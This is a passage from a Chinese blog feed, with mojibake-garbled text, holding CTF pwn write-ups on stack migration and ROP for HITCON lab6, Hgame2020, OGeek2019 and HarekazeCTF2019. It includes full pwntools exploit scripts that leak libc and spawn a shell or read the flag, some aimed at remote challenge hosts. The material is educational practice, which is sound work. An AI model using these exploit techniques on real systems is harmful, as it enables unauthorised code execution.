href="#HITCON-training-lab6-64ä½" class="headerlink" title="HITCON_training_lab6_64ä½"></a>HITCON_training_lab6_64ä½</h3><p>è¿™ä¸ªæ˜¯åœ¨HITCON_trainingçš„ä¸€ä¸ªç»ƒä¹ ï¼Œç›´æ¥ç»™çš„æœ‰æºç ï¼Œæˆ‘ç»™ç¼–è¯‘æˆäº†64ä½ç‰ˆæœ¬ã€‚</p><h4 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h4><div class="hljs"><pre><code>#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre></div><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> ç¼–è¯‘å‘½ä»¤</p><h4 id="ç®€å•åˆ†æ"><a href="#ç®€å•åˆ†æ" class="headerlink" title="ç®€å•åˆ†æ"></a>ç®€å•åˆ†æ</h4><p>è¿™ä¸ªé¢˜çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ çš„Stack Migrationç”¨çš„ï¼Œå¯ä»¥ä¸åˆ†æä»£ç ç›´æ¥ç”¨gdb-pedaç›´æ¥æ¥æµ‹è¯•ï¼š<br><img src="http://qiqianyun.chumen77.xyz/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://qiqianyun.chumen77.xyz/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>ç†Ÿæ‚‰çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯ä¸‹é¢å¤šå‡ºæ¥çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œä¹Ÿæ˜¯ç¨‹åºä¸èƒ½æ¥å—çš„éƒ¨åˆ†ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªéœ€è¦è€ƒè™‘æ ˆè¿ç§»çš„æ ‡å¿—ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>æ³¨æ„ä¸€ä¸‹rspè¢«è¦†ç›–çš„å€¼ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>è®¡ç®—paddingä¸º48.<br><img src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>è®¡ç®—ä¸€ä¸‹ï¼Œå¯ä»¥å¡«å…¥å¤šå°‘çš„å¯æ§å­—æ®µã€‚å»é™¤ä¸€ä¸‹åˆšåˆšç¨‹åºä¸èƒ½å­˜å…¥çš„éƒ¨åˆ†å’Œpaddingéƒ¨åˆ†ï¼Œè¿˜æœ‰80ä¸ªå­—èŠ‚å¯ä»¥ç”¨ã€‚å…¶ä¸­ä¸€ä¸ªæ¥ä¼ªé€ new espï¼Œå‰©ä¸‹ä¹Ÿå°±è¿˜æœ‰9ä¸ªgadgetå¯ä»¥ç”¨ï¼Œå¯ä»¥ç»™æˆ‘æ„é€ ç¬¬ä¸€ä¸ªropé“¾ã€‚</p><h4 id="å›¾è§£åˆ†æ"><a href="#å›¾è§£åˆ†æ" class="headerlink" title="å›¾è§£åˆ†æ"></a>å›¾è§£åˆ†æ</h4><p>å‡è®¾æˆ‘ä»¬å·²ç»å¡«å…¥äº†æº¢å‡ºå­—ç¬¦ï¼Œbuf1å³ä¸ºæˆ‘ä»¬è¦å»çš„æ–°æ ˆï¼Œè¿™ä¸ªé€‰æ‹©bssæ®µçš„åä¸€åŠï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>å¼€å§‹æ‰§è¡Œä¸€ä¸‹leave ä¸­çš„<code>mov rsp,rbp</code>ï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>æ­¤æ—¶rsp ä¹ŸæŒ‡å‘äº† rbpæŒ‡å‘çš„ä½ç½®ï¼Œåœ¨æ‰§è¡Œleaveä¸­çš„<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>æ­¤æ—¶rbpå·²ç»åˆ°äº†æˆ‘ä»¬ä¼ªé€ çš„æ–°æ ˆbuf1ï¼Œç„¶åå¼€å§‹æ‰§è¡Œret,è¿›å…¥æ‰§è¡Œpop_rdiçš„gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p><p>æ­¤æ—¶å·²ç»å°†buf1çš„åœ°å€ï¼Œæ¨å…¥rdiï¼Œä½œä¸ºgetsçš„å‚æ•°ï¼Œæ‰§è¡Œgetså‡½æ•°åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€buf1ä¸Šå¡«å…¥æˆ‘ä»¬çš„ropé“¾ï¼Œæ­¤æ—¶æ ˆå¤§å°å·²ç»æ²¡æœ‰é™åˆ¶äº†ï¼Œå¯ä»¥ä»»æ„å†™ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>åœ¨è¿™ä¸ªbuf1çš„æ ˆç©ºé—´é‡Œï¼Œæˆ‘ä»¬éœ€è¦å…ˆæŠŠrbpæŒ‡å‘çš„ä½ç½®å†™å…¥buf2ï¼ˆä¸‹ä¸€ä¸ªæ„é€ çš„æ–°æ ˆï¼‰ï¼Œç„¶åæ„é€ ropé“¾æŠŠputsçš„å†…å­˜åœ°å€ç»™æ³„éœ²å‡ºæ¥ï¼Œè¿›è€Œå¯ä»¥ç®—å‡ºlibcçš„åŸºåœ°å€ï¼Œæ¥ç€å†æ„é€ ä¸€ä¸ªgetså‡½æ•°ã€‚æ¥ç€æ˜¯æ‰§è¡Œä¸€ä¸‹leave çš„gadgetï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>æ‰§è¡Œå®Œä»¥åå°±å¯ä»¥å‘ç°æˆ‘ä»¬ï¼Œå·²ç»å®Œå…¨æ§åˆ¶äº†æ ˆã€‚å¹¶ä¸”å¼€äº†ä¸€ä¸ªbuf2çš„æ–°æ ˆï¼Œç•™ç€åœ¨buf1è°ƒç”¨getså‡½æ•°æ—¶æ¥åœ¨buf2æ–°æ ˆä¸­æ‘†ä¸Šè°ƒç”¨system(/bin/sh)å‡½æ•°çš„ropé“¾ã€‚ç„¶åç»§ç»­æ‰§è¡Œï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>è¿™å°±æ³„éœ²å‡ºäº†putså‡½æ•°çš„å†…å­˜åœ°å€ã€‚æ¥ç€å¼€å§‹å¾€buf2æ–°æ ˆä¸Šè¯»ropé“¾:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>è¯»å…¥å®Œæˆï¼Œæ¥ç€å†æ¬¡æ‰§è¡Œleaveçš„gadgetï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>å¯ä»¥çœ‹åˆ°espåˆ°äº†æ–°æ ˆï¼Œrbpå› ä¸ºåˆšåˆšåœ¨buf2å¡«å…¥çš„buf1ï¼Œåˆä¼šåˆ°äº†buf1ï¼Œè¿™ä¸ªåœ°å€å¯ä»¥éšä¾¿å¡«äº†ï¼Œå¯¹åšé¢˜ä¸å½±å“ï¼Œå¡«å†™è¿™ä¸ªåªæ˜¯å¯ä»¥çœ‹åˆ°å†æ¬¡æ ˆè½¬ç§»ã€‚æ¥ç€æ‰§è¡Œbuf2æ–°æ ˆçš„ropé“¾ï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>å€Ÿç€è¿™ä¸ªæ€è·¯å°±å¯ä»¥å¼€å§‹å†™exp:</p><div class="hljs"><pre><code>from pwn import *import timecontext.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;e = ELF(&apos;./test&apos;)l = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;) # io = remote(&apos;127.0.0.1&apos;,4000)io = process(&apos;./test&apos;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&apos;puts&apos;]puts_got = e.got[&apos;puts&apos;]read_add = e.symbols[&apos;read&apos;]io.recvuntil(&apos;:&apos;)p = &apos;a&apos;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&apos;-&gt;&apos;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&apos;-&gt;&apos;)io.sendline(p)io.recvuntil(&apos;\n&apos;)puts = u64((io.recv(6)).ljust(8,&apos;\x00&apos;))libc = puts - l.symbols[&apos;puts&apos;]print(&apos;libc_base:&apos; + hex(libc))binsh_add = l.search(&apos;/bin/sh\x00&apos;).next() + libc#print(binsh_add)# raw_input(&apos;-&gt;&apos;)system_add = l.symbols[&apos;system&apos;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive()</code></pre></div><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32ä½ç¨‹åºï¼Œå¼€äº†nxä¿æŠ¤</p><h4 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>è¿™ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯0x60-0x50-0x8 = 8ã€‚å‘ç°åªæœ‰ä¸€ä¸ªgadgetä½ç½®ï¼Œæ— æ³•æ„é€ æˆ‘ä»¬æƒ³è¦çš„ropé“¾ã€‚ä½†æ˜¯å‰é¢çš„ç¬¬ä¸€ä¸ªreadå‡½æ•°ï¼Œå¯ä»¥è¯»å…¥å¾ˆå¤§ç©ºé—´ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°bufçš„åœ°å€æ˜¯å›ºå®šçš„ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>é‚£è¿™ä¸ªé¢˜æ˜æ˜¾å°±æ˜¯å¯ä»¥Stack Migrationæ¥è§£å†³é—®é¢˜äº†ï¼Œå¹¶ä¸”åªéœ€å†å†™ä¸€ä¸ªleave retå°±æ§åˆ¶æ ˆäº†ã€‚</p><h5 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h5><p>ç¨‹åºä¸­æœ‰ç€openï¼Œreadï¼Œputså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªropé“¾ï¼Œè°ƒç”¨openå‡½æ•°ï¼Œæ§åˆ¶å…¶å‚æ•°æ˜¯<code>./flag</code>ï¼Œå¹¶åœ¨gdbä¸­è°ƒè¯•å°†å…¶è¿”å›çš„æ–‡ä»¶fdå·è®°å½•ä¸‹æ¥ï¼Œç„¶åä¼ é€’ç»™readå‡½æ•°ï¼Œè®©å…¶è¯»å…¥æ–‡ä»¶å†…å®¹å­˜å…¥æŸä¸ªç¼“å†²åŒºï¼Œå†ç”¨putså‡½æ•°è¾“å‡ºä¸€ä¸‹flagæ–‡ä»¶çš„å†…å®¹å³å¯ã€‚åœ¨ç¬¬ä¸€ä¸ªreadçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦å†™å¥½ropé“¾ã€‚ç„¶ååœ¨æœ€åä¸€ä¸ªreadå‡½æ•°æ—¶ï¼Œæ§åˆ¶å¥½ebpæŒ‡å‘æˆ‘ä»¬çš„æ–°æ ˆã€‚</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code>from pwn import *context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;# io = process(&apos;./ROP&apos;)io = remote(&apos;47.103.214.163&apos;,20300)e = ELF(&apos;./ROP&apos;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&apos;think so?\n&apos;)p = flat([&apos;./flag\x00\x00&apos;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&apos;\n&apos;)p = padding * &apos;a&apos; + p64(buf) + p64(leave_ret)raw_input(&apos;-&gt;&apos;) #æ‰‹åŠ¨ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œä»¥åè®©gdbé™„åŠ ä¸Šè¿›è¡Œè°ƒè¯•io.send(p)flag = io.recvline_contains(&apos;hgame&apos;)print(flag)io.interactive()</code></pre></div><p>æˆ‘ä»¬è·Ÿç€expæ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ•ˆæœï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>æ­¤æ—¶çš„espæ˜¯æˆ‘ä»¬ä¼ªé€ çš„new espï¼Œå·²ç»æŒ‡å‘äº†æˆ‘ä»¬çš„ç›®æ ‡ä½ç½®ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªropé“¾æ¥å·²ç»é€è¿‡å»ï¼Œå¯ä»¥çœ‹åˆ°<code>./flag</code>çš„å­—çœ¼ã€‚æ‰§è¡Œä¸€ä¸‹leaveï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>å¯ä»¥çœ‹åˆ°rbpçš„å€¼å·²ç»ç­‰äºæˆ‘ä»¬ä¼ªé€ çš„å€¼ï¼Œespè¿˜åœ¨åŸæ¥æ ˆä¸Šã€‚æ¥ç€æ‰§è¡Œretï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªleave retï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>å…ˆè®°å½•ä¸‹å½“å‰çš„çŠ¶æ€ï¼Œå¼€å§‹æ‰§è¡Œleaveï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>æ‰§è¡Œå®Œå‘ç°espå·²ç»åˆ°è¾¾äº†æ–°æ ˆbuf+8çš„ä½ç½®ï¼Œæ­¤æ—¶çš„æ ˆå¸§å·²ç»æ˜¯æˆ‘ä»¬å®Œå…¨æƒ³è¦çš„ï¼Œå·²ç»åŠ«æŒäº†ç¨‹åºæµç¨‹ï¼Œå¹¶ä¸”æ–°æ ˆç©ºé—´å¾ˆå¤§ï¼Œå¯ä»¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ebpæ˜¯å¤šå°‘å·²ç»ä¸é‡è¦äº†ï¼Œæˆ‘ä»¬ç›´æ¥å¡«å…¥<code>./flag</code>ï¼Œè¿™ä¸ªå›ºå®šåœ°å€ä¹Ÿåšä¸ºç»™openå‡½æ•°åšå‚æ•°ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œæ‰§è¡Œå®Œopenå‡½æ•°éœ€è¦æŠŠè¿”å›çš„fdå€¼è®°å½•ä¸‹ï¼Œç»™readå‡½æ•°åšå‚æ•°ã€‚æœ€åç”±putså‡½æ•°åœ¨è¾“å‡ºflagï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p><h3 id="Stack-Migrationå°æ€»ç»“"><a href="#Stack-Migrationå°æ€»ç»“" class="headerlink" title="Stack Migrationå°æ€»ç»“"></a>Stack Migrationå°æ€»ç»“</h3><p> è¿™ä¸‹å¯ä»¥æ€»ç»“ä¸‹åˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯</p><ul><li>æŠŠæ§å¥½èµ·åˆæ ˆçš„ebpï¼Œåœ¨é‡Œé¢å†™å…¥éœ€è¦ä¼ªé€ çš„new esp</li><li>åœ¨ä¹‹åçš„å¯åˆ©ç”¨å­—èŠ‚ä¸­å†™å…¥leave gadget</li><li>å°†æƒ³æ‰§è¡Œçš„ROP Chainå†™åœ¨å·²çŸ¥å›ºå®šä½ç½®ä¸Š</li><li>å†åˆ©ç”¨leaveæ¬ç§»Stackä½ç½®åˆ°å·²çŸ¥ä½ç½®</li><li>ç„¶åæ— é™æ¥ROP Chain</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROPé¢˜ç›®ç»ƒä¹ </title>
    <link href="/2020/02/03/ROP%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/03/ROP%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ROPé¢˜ç›®ç»ƒä¹ "><a href="#ROPé¢˜ç›®ç»ƒä¹ " class="headerlink" title="ROPé¢˜ç›®ç»ƒä¹ "></a>ROPé¢˜ç›®ç»ƒä¹ </h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨å­¦ä¹ æ ˆæº¢å‡ºï¼Œåšäº†ä¸€äº›ROPçš„ç»ƒä¹ é¢˜ï¼ŒåŸºæœ¬éƒ½æ˜¯buuojçš„é¢˜ç›®ï¼Œæœç´¢ropå­—çœ¼æ‰¾çš„ropé¢˜ã€‚ç®€å•è®°å½•ä¸€ä¸‹æ”¶è·å’Œexpã€‚</p><h1 id="æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰"><a href="#æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰" class="headerlink" title="æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰"></a>æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32ä½ç¨‹åºï¼Œå¼€å¯NXå †æ ˆä¸å¯æ‰§è¡Œã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>å¯ä»¥çœ‹å‡ºå…¶å–äº†ä¸€ä¸ªéšæœºæ•°ï¼Œå­˜å…¥bufã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°åˆ†æï¼Œçœ‹åˆ°æ¥æ”¶bufä¼ æ¥çš„å€¼ï¼Œæ”¾å…¥sä¸­ã€‚ç„¶åä¸‹é¢æ¥æ”¶ä½ ä¼ å…¥çš„ä¸œè¥¿ï¼Œä¸såˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œä¸ç›¸åŒå°±ä¼šé€€å‡ºã€‚ç„¶åå¦‚æœä¸é€€å‡ºè¿”å›å€¼æ˜¯v5ï¼Œä½†æ˜¯è¿™é‡Œçš„v5åœ¨å‡½æ•°ä¸­æ˜¯æ²¡æœ‰ç»è¿‡å¤„ç†çš„ã€‚çœ‹ä¸€ä¸‹æ±‡ç¼–ï¼š<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5å’±ä»¬æƒ³æ§åˆ¶ï¼Œå°±åªèƒ½é€šè¿‡åŸæ¥é‚£ä¸ªreadå‡½æ•°ï¼Œå’±ä»¬ä¼ å…¥çš„å€¼å»æ§åˆ¶ã€‚è¿”å›å€¼ç»™v2ï¼Œç„¶åv2ä½œä¸ºå‚æ•°ç„¶åè¿›å…¥ä¸‹é¢è¿™ä¸ªå¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ä¸­ã€‚<br> <img src="/2020/02/03/ROPç»ƒä¹ /images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>è§‚å¯Ÿåï¼Œå¯ä»¥çœ‹å‡ºå’±ä»¬åº”è¯¥æŠŠè¿™ä¸ªè¿”å›çš„å‚æ•°æ•´çš„å¤§ä¸€ç‚¹ï¼Œæ–¹ä¾¿è¿›è¡Œå†™ROPé“¾ã€‚</p><h4 id="åˆ†ææ€»ç»“"><a href="#åˆ†ææ€»ç»“" class="headerlink" title="åˆ†ææ€»ç»“"></a>åˆ†ææ€»ç»“</h4><p>å…¶ä¸­å¯¹äºç»•è¿‡ç›¸ç­‰åˆ¤æ–­ï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹strlenå‡½æ•°çš„ç‰¹æ€§ï¼Œç„¶åç›´æ¥ç”¨<code>\x00</code>æ¥æˆªæ–­ã€‚<br>v5è¿™ä¸ªè¿”å›å‚æ•°å¯ä»¥æ§åˆ¶ä¸ºâ€™\xffâ€™,ç„¶åè¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œå†™ropé“¾å°±è¡Œäº†ã€‚<br>å…ˆç”¨putså‡½æ•°æ³„éœ²å‡º<code>__libc_start_main</code>çš„åœ°å€ï¼Œç„¶ååœ¨ç»™çš„libcä¸­ç¡®è®¤ä¸‹symbolsï¼Œç„¶åæ‹¿åˆ°libcåŸºå€ï¼Œç„¶åç›´æ¥åˆ©ç”¨one gadget RCEå³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-comment"># io = process('./pwn')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27780</span>)libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)<span class="hljs-comment"># blibc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span>elf = ELF(<span class="hljs-string">'./pwn'</span>)<span class="hljs-comment"># raw_input('-&gt;')</span>p1 = <span class="hljs-string">'\x00'</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\xff'</span>) offset = <span class="hljs-number">0xe7</span> + <span class="hljs-number">4</span>io.send(p1 + <span class="hljs-string">'\n'</span>)io.recvline_contains(<span class="hljs-string">'Correct'</span>)start_add=<span class="hljs-number">0x080485A0</span>put_add = elf.symbols[<span class="hljs-string">'puts'</span>]libc_start_add = elf.got[<span class="hljs-string">'__libc_start_main'</span>]rop1 = [    put_add,    start_add,    libc_start_add]p2 = offset * <span class="hljs-string">'\x00'</span> + <span class="hljs-string">''</span>.join(map(p32,rop1))io.sendline(p2)sleep(<span class="hljs-number">1</span>)libc_base = u32(io.recv(<span class="hljs-number">4</span>)) - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]REC = libc_base+<span class="hljs-number">0x3a80c</span>print(<span class="hljs-string">'libc_base :'</span>+hex(libc_base))offset = <span class="hljs-number">0xe7</span> + <span class="hljs-number">4</span>io.send(p1 + <span class="hljs-string">'\n'</span>)io.recvline_contains(<span class="hljs-string">'Correct'</span>)p3 = offset * <span class="hljs-string">'\x00'</span> + p32(REC)io.sendline(p3)io.interactive()</code></pre></div><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span>  system(<span class="hljs-string">"echo -n \"What's your name? \""</span>);  __isoc99_scanf(<span class="hljs-string">"%s"</span>, &amp;v4);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome to the Pwn World, %s!\n"</span>, &amp;v4);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>ç¨‹åºååˆ†ç®€å•ï¼Œç»™äº†systemå‡½æ•°ï¼Œä¸”æ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>idaæŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œè¯¥å¯ä»¥å‘ç°<code>/bin/sh</code>/ï¼Œè¿™æ„é€ ä¸ªç®€å•ropé“¾ç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *import time<span class="hljs-comment"># io = process('./babyrop')</span>io = remote('node3.buuoj.cn',28633)elf = ELF('./babyrop')offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols['system']<span class="hljs-comment"># io.recvline_contains('your')</span><span class="hljs-comment"># raw_input('-&gt;')</span>p = 'a' * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre></div><p>æ‹¿åˆ°shellåï¼Œè¿™ä¸ªé¢˜buuctfæ ¹ç›®å½•ä¸‹æ²¡æœ‰flagæ–‡ä»¶ã€‚éœ€è¦<code>find / -name &quot;flag&quot;</code> å¯ä»¥æŸ¥åˆ°æ˜¯åœ¨<code>/home/babyrop/flag</code>è¿™ä¸ªç›®å½•ä¸‹ã€‚</p><h2 id="HarekazeCTF2019-baby-rop2"><a 